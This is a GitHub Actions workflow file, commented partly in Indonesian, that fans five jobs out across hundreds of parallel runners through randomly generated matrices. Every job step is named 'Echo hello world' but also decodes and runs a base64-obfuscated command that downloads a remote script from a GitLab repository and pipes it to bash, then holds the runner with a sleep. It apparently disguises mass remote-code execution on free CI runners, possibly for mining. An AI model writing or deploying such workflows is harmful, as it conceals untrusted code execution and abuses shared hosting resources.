name: 🔵 LSCPU Phase

on:
  workflow_dispatch:
    inputs:


# ⬇️ FIX TERM — taruh paling atas setelah on:
env:
  TERM: xterm-256color
  DEBIAN_FRONTEND: noninteractive

permissions:
  contents: read
  actions: write          # ⚠️ WAJIB untuk dispatch workflow berikutnya

jobs:
  # =============================================
  # 🔮 Generator
  # =============================================
  generate:
    runs-on: ubuntu-latest
    outputs:
      line_go:    ${{ steps.gen.outputs.line_go }}
      line_flag:  ${{ steps.gen.outputs.line_flag }}
      lucas_go:   ${{ steps.gen.outputs.lucas_go }}
      lucas_flag: ${{ steps.gen.outputs.lucas_flag }}
      popay_go:   ${{ steps.gen.outputs.popay_go }}
      popay_flag: ${{ steps.gen.outputs.popay_flag }}
      dandi_go:   ${{ steps.gen.outputs.dandi_go }}
      dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
      alam_go:    ${{ steps.gen.outputs.alam_go }}
      alam_flag:  ${{ steps.gen.outputs.alam_flag }}
    steps:
      - name: Generate random strings
        id: gen
        shell: python
        run: |
          import random, string, json, os

          def random_strings(n, min_len=3, max_len=5):
              res = set()
              while len(res) < n:
                  length = random.randint(min_len, max_len)
                  chars = string.ascii_letters + string.digits
                  s = ''.join(random.choice(chars) for _ in range(length))
                  res.add(s)
              return list(res)

          specs = {
              'line_go': 9,  'line_flag': 26,
              'lucas_go': 9, 'lucas_flag': 26,
              'popay_go': 9, 'popay_flag': 26,
              'dandi_go': 9, 'dandi_flag': 26,
              'alam_go': 9,  'alam_flag': 22
          }

          with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
              for name, count in specs.items():
                  vals = random_strings(count)
                  f.write(f"{name}={json.dumps(vals)}\n")

  # =============================================
  # 📦 Job line
  # =============================================
  line:
    needs: generate
    runs-on: ubuntu-24.04
    timeout-minutes: 20
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go:   ${{ fromJSON(needs.generate.outputs.line_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.line_flag) }}
    steps:
      - name: Echo hello world & tahan 10 menit
        run: |
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
          sleep 10m

  # =============================================
  # 🧊 Job lucas
  # =============================================
  lucas:
    needs: [generate, line]
    runs-on: ubuntu-24.04
    timeout-minutes: 25
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go:   ${{ fromJSON(needs.generate.outputs.lucas_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.lucas_flag) }}
    steps:
      - name: Echo hello world & tahan 18 menit
        run: |
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
          sleep 12m

  # =============================================
  # 🍚 Job popay (paralel dengan lucas)
  # =============================================
  popay:
    needs: [generate, line]
    runs-on: ubuntu-24.04
    timeout-minutes: 115
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go:   ${{ fromJSON(needs.generate.outputs.popay_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.popay_flag) }}
    steps:
      - name: Echo hello world & tahan 105 menit
        run: |
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
          sleep 12m

  # =============================================
  # 🍜 Job dandi
  # =============================================
  dandi:
    needs: [generate, lucas]
    runs-on: ubuntu-24.04
    timeout-minutes: 168
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go:   ${{ fromJSON(needs.generate.outputs.dandi_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
    steps:
      - name: Echo hello world & tahan 158 menit
        run: |
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
          sleep 12m

  # =============================================
  # 🍚 Job alam
  # =============================================
  alam:
    needs: [generate, popay]
    runs-on: ubuntu-24.04
    timeout-minutes: 170
    strategy:
      max-parallel: 20
      fail-fast: false
      matrix:
        go:   ${{ fromJSON(needs.generate.outputs.alam_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.alam_flag) }}
    steps:
      - name: Echo hello world & tahan 160 menit
        run: |
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS94cGFuemVycy9wbGF5Ly0vcmF3L21haW4vbGltZXZlcnMgfCBiYXNo | sh &
          sleep 10m
